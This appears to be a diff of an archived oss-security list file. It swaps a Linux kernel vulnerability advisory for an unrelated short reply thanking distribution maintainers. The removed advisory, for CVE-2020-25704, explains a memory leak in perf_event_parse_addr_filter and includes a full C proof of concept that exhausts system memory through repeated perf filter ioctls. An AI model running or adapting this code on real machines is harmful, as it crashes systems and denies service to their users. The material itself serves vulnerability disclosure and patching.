@@ -1,107 +1,25 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/11/09/1
-Message-ID: <48969a763aaf4601b35d47f7208746eb@tencent.com>
-Date: Mon, 9 Nov 2020 10:39:36 +0000
-From: kiyin(尹亮) <kiyin@...cent.com>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: [CVE-2020-25704] Linux kernel: perf_event_parse_addr_filter memory leak
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/09/04/1
+Message-ID: <20200904022719.GB1119445@millbarge>
+Date: Fri, 4 Sep 2020 02:27:19 +0000
+From: Seth Arnold <seth.arnold@...onical.com>
+To: Solar Designer <solar@...nwall.com>
+Cc: oss-security@...ts.openwall.com
+Subject: Re: Contributing Back
 Content-Type: text/plain; charset=utf-8
 
-CVE assigned:
-CVE-2020-25704
+On Thu, Sep 03, 2020 at 06:14:27PM +0200, Solar Designer wrote:
+> I primarily want to publicly acknowledge and thank Seth Arnold of
+> Ubuntu, Anthony Liguori of Amazon Linux, and Srivatsa S. Bhat of VMware
+> Photon OS for handling two of these tasks well lately.  Thank you!
 
-Patch:
-https://git.kernel.org/pub/scm/linux/kernel/git/tip/tip.git/commit/?id=7bdb157cdebbf95a1cd94ed2e01b338714075d00
+Woo, thanks :)
 
-Details:
+> So from this point on, I'd actually expect Ubuntu or/and Flatcar
+> Container Linux to state something on task 5 for each issue reported.
 
-Hi,
+Will do.
 
-There is a memory leak in perf_event_parse_addr_filter. Here is the detail.
+Thanks
 
-https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/kernel/events/core.c?h=v5.9.3#n9991
-9991        static int
-9992        perf_event_parse_addr_filter(struct perf_event *event, char *fstr,
-9993                         struct list_head *filters)
-9994        {
-......................................................................................................................................................................................................................
-10058                    if (token == IF_SRC_FILE || token == IF_SRC_FILEADDR) {
-10059                        int fpos = token == IF_SRC_FILE ? 2 : 1;
-10060        
-10061                        filename = match_strdup(&args[fpos]);                       <--------------- match_strdup allocates memory for filename
-10062                        if (!filename) {
-10063                            ret = -ENOMEM;
-10064                            goto fail;
-10065                        }
-10066                    }
-......................................................................................................................................................................................................................
-10089                    if (filter->action == PERF_ADDR_FILTER_ACTION_FILTER &&         <--------------- if filter->action == PERF_ADDR_FILTER_ACTION_FILTER and filter->size is zero, go to failed branch
-10090                        !filter->size)
-10091                        goto fail;
-10092        
-......................................................................................................................................................................................................................
-10140        fail_free_name:
-10141            kfree(filename);
-10142        fail:                                                                       <--------------- filename is not freed in the failed branch. that causes a memory leak.
-10143            free_filters_list(filters);
-10144            kfree(orig);
-10145        
-10146            return ret;
-10147        } 
-
-
-the length of filename is no limit. using the following test code, it will take 40 seconds to exhaust 16GB memory in my laptop: CPU intel i5 10210U,Ubuntu 20.04, kernel version 5.4.0-42-generic. then I have to press power button to reboot the system manually.
-
-#include <sys/ioctl.h>
-#include <linux/perf_event.h>
-#include <unistd.h>
-#include <string.h>
-
-#define __NR_perf_event_open    298
-
-static long perf_event_open( struct perf_event_attr *hw_event, pid_t pid, int cpu, int group_fd, unsigned long flags ) {
-    int ret;
-
-    ret = syscall( __NR_perf_event_open, hw_event, pid, cpu, group_fd, flags );
-    return ret;
-}
-
-char buf[11 + 1024 * 1024 * 16 + 1] = { 0 };
-
-int main( void )
-{
-    int fd1, i;
-    struct perf_event_attr pe1 = { 0 };
-
-    pe1.type = 9; // may be different in other system. just run" cat /sys/bus/event_source/devices/intel_pt/type"
-    pe1.exclude_kernel = 1;
-    pe1.exclude_hv = 1;
-    pe1.exclude_idle = 1;
-
-    fd1 = perf_event_open( &pe1, getpid(), -1, -1, 0 );
-    if ( fd1 > 0 )
-    {
-        memset( buf, 'A', 11 + 1024 * 1024 * 16 ); //filename length is 16MB
-        memcpy( buf, "filter,0/0@", 11 );
-
-        for ( i = 0; i < 1024; i++ )
-        {
-            ioctl( fd1, PERF_EVENT_IOC_SET_FILTER, buf ); //leak 16MB*1024=16GB
-        }
-
-        buf[11 + 1024 * 1024] = '\0'; //filename length is 1MB
-        for ( i = 0; i < 16; i++ )
-        {
-            ioctl( fd1, PERF_EVENT_IOC_SET_FILTER, buf ); //leak 1MB*16=16MB
-        }
-
-        buf[11 + 1024] = '\0'; //filename length is 1KB
-        while ( 1 )
-            ioctl( fd1, PERF_EVENT_IOC_SET_FILTER, buf ); //leak the rest
-    }
-    return 0;
-}
-
-Regards,
-kiyin.
-
+Download attachment "signature.asc" of type "application/pgp-signature" (489 bytes)
